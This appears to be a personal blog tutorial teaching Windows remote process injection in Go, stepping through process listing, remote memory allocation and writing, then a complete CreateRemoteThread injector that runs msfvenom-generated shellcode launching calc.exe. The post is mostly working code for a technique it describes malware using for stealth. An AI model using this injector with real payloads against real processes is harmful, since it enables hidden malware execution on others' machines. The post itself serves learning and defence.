---
layout: default
title: Jairo's Blog
---

<center>
<img src="https://www.pccybersecurity.com/images/blog/code-injection.png">
</center>
<h6>December 6<sup>th</sup>, 2021</h6>
## Process Injection With Go.
The idea of this post is to learn how to perform a remote process injection using the Windows APIs and
the Go /x/sys/windows package.

<h3>What is code injection?</h3>
Code injection is a technique where a process can insert a part of or all of its code from its own running process into another target process.

<h3>Why to inject code?</h3>
Code injection is a legit activity, this is used by some security tools, but it could be abused by malware to its own benefit.

Some reasons malware performs code injection are:

<b>1. Stealth:</b> To avoid detection a malware can inject all or part of its code into legitimate processes already running on the system.

<b>2. Modify a process behaviour:</b> For example there is a malware running and don't want to be discovered by the casual user, then this
 malware can alter let's say the Windows explorer or the process explorer to not display the malware on disk or memory.

<b>3. To piggyback other process:</b> Let's say a malware want to reach tne internet, but it is not allowed to do so by X or Y reason, then
 this malware can inject code into a process that have permissions to reach the internet.

<h3>Common Injection Techniques:</h3>

<b>*</b> Process Hollowing.<br>
<b>*</b> Process Thread Injection. (This technique will be the focus of this post)<br>
<b>*</b> Dll Injection (Classic and Reflective).<br>
<b>*</b> Shellcode injection.<br>
<b>*</b> Atom Bombing.<br>
<b>*</b> QueueUser APC.<br>

<h3>What are the injection steps?</h3>

<h4>1.Locate the target process.</h4>
The first thing to do is to search for a process to inject the malware code into.
Common APIs used by malware to perform this tasks are <b>createToolhelp32Snapshot</b>, <b>Process32FirstW</b> and <b>Process32NextW</b>.

This is the Go code to list Windows processes using the APIs mentioned above.
```golang
package main

import (
   "fmt"
   "log"
   "os"
   "syscall"
   "unsafe"
)

const MAX_PATH = 260

type PROCESSENTRY32 struct {
   dwSize              uint32
   cntUsage            uint32
   th32ProcessID       uint32
   th32DefaultHeapID   uintptr
   th32ModuleID        uint32
   cntThreads          uint32
   th32ParentProcessID uint32
   pcPriClassBase      int32
   dwFlags             uint32
   szExeFile           [MAX_PATH]uint16
}

var procStruct PROCESSENTRY32

type processInfo struct {
   pid      int
   ppid     int
   procName string
}

var (
   kernel32dll      = syscall.NewLazyDLL("kernel32.dll")
   createTool32Snap = kernel32dll.NewProc("CreateToolhelp32Snapshot")
   closeHandle      = kernel32dll.NewProc("CloseHandle")
   process32First   = kernel32dll.NewProc("Process32FirstW")
   process32Next    = kernel32dll.NewProc("Process32NextW")
)

func main() {
   handle, _, _ := createTool32Snap.Call(2, 0)
   if handle < 0 {
      log.Fatal("Error when creating the snapshot")
   }
   defer closeHandle.Call(handle)

   procStruct.dwSize = uint32(unsafe.Sizeof(procStruct))

   ret, _, _ := process32First.Call(handle, uintptr(unsafe.Pointer(&procStruct)))
   if ret == 0 {
      log.Fatal("Error when getting snapshot info")
   }

   for i := 0; i <= 50; i++ {
      newWindowsProcess(&procStruct, handle)
   }

}

func newWindowsProcess(e *PROCESSENTRY32, handle uintptr) {
   end := 0
   for {
      if e.szExeFile[end] == 0 {
         break
      }
      end++
   }

   pid := int(e.th32ProcessID)
   exe := syscall.UTF16ToString(e.szExeFile[:end])

   fmt.Printf("PID: %d, Name: %s\n", pid, exe)

   ret, _, _ := process32Next.Call(handle, uintptr(unsafe.Pointer(&procStruct)))
   if ret == 0 {
      os.Exit(0)
   }
}

```

The next image displays a segment of the results shown by the last code.

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img001.png">

Now, being able to list Windows processes, I can move to the next steps.

<br>
<h4>2. Allocate memory in the remote target process.</h4>
Once I am able to determine the process name and PID, I can proceed to write code to use a PID and allocate memory in a new remote target process.

The APIs used in these tasks are <b>OpenProcess</b> and <b>VirtualAllocEx</b>

The <b>OpenProcess</b> will need the following arguments: 
```
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
If the function succeeds, the return value is an open handle to the specified process.

<b>VirtualAllocEx</b> will use the following arguments:
```
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);

```

The following code allocates 9216 bytes in a remote process (this number is rounded to the next page size by the VirtualAllocEx API), to do that, this program will ask the user for a PID.

```golang
package main

import (
   "fmt"
   "log"
   "strconv"
   "syscall"
)

var (
   kernel32dll  = syscall.NewLazyDLL("kernel32.dll")
   openProcess  = kernel32dll.NewProc("OpenProcess")
   virtualAlloc = kernel32dll.NewProc("VirtualAllocEx")
)

func main() {
   fmt.Printf("Allocate memory in remote process.\n\n")

   var p string

   fmt.Printf("Target PID: ")
   fmt.Scanf("%s", &p)

   pid, err := strconv.Atoi(p)
   if err != nil {
      log.Fatal("Error when converting string")
   }

   handle, _, _ := openProcess.Call(0x001FFFFF, 0, uintptr(pid))

   fmt.Printf("Process Handle: %d\n", handle)
   fmt.Printf("Allocating: 4096 bytes\nPermission: RWX\n")

   address, _, _ := virtualAlloc.Call(
      handle,
      uintptr(0),
      uintptr(9216),
      uintptr(0x00001000),
      uintptr(0x40),
   )

   fmt.Printf("Memory allocated at address: 0x%x", address)

}
```
Before running this code, I did open ProcessHacker and I did located the Notepad.exe process as follows:

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img002.png">

In the memory section, we can see all the addresses allocated for the Notepad.exe.

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img003.png">

Running the last Go code and providing the current Notepad.exe PID, it can be seen how the program returns a address:

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img005.png">

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img004.png">

Excellent, I wrote code able to call Windows APIs to allocate new memory space in a remote process.

Remember when I said the API will round up the allocation bytes to the next page size? That can be seen in the previous screenshot,
the API rounded up our 9kb bytes to 12kb.

Let's proceed to the next step.

<h4>3. Write into the allocated memory space.</h4>
Now, in this section, I will use the api <b>WriteProcessMemory</b> to write into the remote and recently allocated memory.

The steps are identical to the last example, except I will add a call to the aforementioned api.

These are the arguments needed in order to call WriteProcessMemory and write in the remote memory.
```
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

Let's edit the last example's code as follows:

```golang
package main

import (
   "bufio"
   "fmt"
   "log"
   "os"
   "strconv"
   "strings"
   "syscall"
   "unsafe"
)

var (
   kernel32dll     = syscall.NewLazyDLL("kernel32.dll")
   openProcess     = kernel32dll.NewProc("OpenProcess")
   virtualAlloc    = kernel32dll.NewProc("VirtualAllocEx")
   writeProcessMem = kernel32dll.NewProc("WriteProcessMemory")
)

func main() {
   fmt.Printf("Allocate memory in remote process.\n\n")

   fmt.Printf("Target PID: ")
   p := readUserIn()

   pid, err := strconv.Atoi(p)
   if err != nil {
      log.Fatal("Error when converting string")
   }

   handle, _, _ := openProcess.Call(
      0x001FFFFF,
      0,
      uintptr(pid),
   )

   fmt.Printf("Process Handle: %d\n", handle)
   fmt.Printf("Allocating: 4096 bytes\nPermission: RWX\n")

   address, _, _ := virtualAlloc.Call(
      handle,
      uintptr(0),
      uintptr(9216),
      uintptr(0x00001000),
      uintptr(0x40),
   )

   fmt.Printf("Memory allocated at address: 0x%x\n", address)

   fmt.Println("Write a message: ")
   message := readUserIn()
   mSize := len(message) * 2

   _, _, err = writeProcessMem.Call(
      handle,
      uintptr(address),
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
      uintptr(mSize),
      uintptr(0),
   )

   strError := err.Error()

   if strings.Contains(strError, "successfully") {
      fmt.Println(strError)

   } else {
      fmt.Println("Unable to write into remote process.")
   }

}

func readUserIn() string {
   scanner := bufio.NewScanner(os.Stdin)
   scanner.Scan()
   text := scanner.Text()
   return text
}

```

Let's run the previous code.

Once again, open notepad.exe, check it's pid in ProcessHacker and keep an eye at the memory allocations.

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img006.png">

<img src="https://jairochavesb.github.io/blog/mages/process_injection_with_go/img007.png">

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/img008.png">

Wow! I did write to the remote process memory successfully! 

Now, let's go to the last step and the most exiting one, running a injected code!

<h4>4. Execute the remote code.</h4>

Ok, using what I've learnt in the last examples, I will write to a remote process a shellcode to call the Windows calculator.

For this task, our new api to be used is <b>CreateRemoteThread</b>, let's reuse the last example and add the new code lines needed.

The payload was generated with msfvenom:
```
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=process -f csharp
```

```golang
package main

import (
   "bufio"
   "fmt"
   "log"
   "os"
   "strconv"
   "strings"
   "unsafe"

   "golang.org/x/sys/windows"
)

var (
   kernel32dll        = windows.NewLazyDLL("kernel32.dll")
   virtualAlloc       = kernel32dll.NewProc("VirtualAllocEx")
   virtualProtect     = kernel32dll.NewProc("VirtualProtectEx")
   writeProcessMem    = kernel32dll.NewProc("WriteProcessMemory")
   CreateRemoteThread = kernel32dll.NewProc("CreateRemoteThreadEx")
)

func main() {
   fmt.Printf("Allocate memory in remote process.\n\n")

   fmt.Printf("Target PID: ")
   p := readUserIn()

   pid, err := strconv.Atoi(p)
   if err != nil {
      log.Fatal("Error when converting string")
   }

   process, _ := windows.OpenProcess(
      windows.PROCESS_CREATE_THREAD|
      windows.PROCESS_VM_OPERATION|
      windows.PROCESS_VM_WRITE|
      windows.PROCESS_VM_READ|
      windows.PROCESS_QUERY_INFORMATION, 
      false, 
      uint32(pid)
   )

   fmt.Printf("Process Handle: %d\n", process)
   fmt.Printf("Allocating: 4096 bytes\nPermission: RWX\n")

   shellcode := []byte{0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 
      0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 
      0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 
      0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 
      0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 
      0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b,
      0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 
      0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 
      0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 
      0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 
      0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 
      0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 
      0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 
      0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 
      0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 
      0x00}

   if err != nil {
      fmt.Println("Error decoding shellcode.")
   }

   mSize := len(shellcode)

   address, _, _ := virtualAlloc.Call(
      uintptr(process),
      uintptr(0),
      uintptr(mSize),
      windows.MEM_COMMIT|windows.MEM_RESERVE,
      windows.PAGE_READWRITE,
   )

   fmt.Printf("Memory allocated at address: 0x%x\n", address)

   _, _, err = writeProcessMem.Call(
      uintptr(process),
      uintptr(address),
      (uintptr)(unsafe.Pointer(&shellcode[0])),
      uintptr(mSize),
      uintptr(0),
   )

   if strings.Contains(err.Error(), "successfully") {
      fmt.Println("Memory written successfully.")

   } else {
      fmt.Println("Unable to write into remote process.")
   }

   op := 0
   _, _, err = virtualProtect.Call(
      uintptr(process),
      uintptr(address),
      uintptr(mSize),
      windows.PAGE_EXECUTE_READ,
      uintptr(unsafe.Pointer(&op)),
   )
   if strings.Contains(err.Error(), "successfully") {
      fmt.Println("Virtual protect called successfully.")

   } else {
      fmt.Println("Unable to Virtual protect.")
   }

   _, _, err = CreateRemoteThread.Call(
      uintptr(process),
      0,
      0,
      uintptr(address),
      0,
      0,
      0,
   )
   if strings.Contains(err.Error(), "successfully") {
      fmt.Println("Remote thread executed!")

   } else {
      fmt.Println("Unable to execute remote thread.")
   }

}

func readUserIn() string {
   scanner := bufio.NewScanner(os.Stdin)
   scanner.Scan()
   text := scanner.Text()
   return text
}

```

For this post, I wrote a target program (A simple hello world) to which I will inject a payload to
execute the Windows calculator. I did not wanted to use any known program for the sake of this demo, call me paranoid but don't want problems with X and Y brands jeje.

The following gif shows the injector program running and popping up a windows calculator.

<img src="https://jairochavesb.github.io/blog/images/process_injection_with_go/demo.gif" style="width:1000px;height:500px;">

<a href="https://jairochavesb.github.io/blog/images/process_injection_with_go/demo.gif" target=blank>Full window gif</a>

I had a very entertained day polishing what I already know about Windows APIs, Go and how malware can
abuse Windows APIs.

I hope this can be informative and useful for anyone.

Thanks for reading!


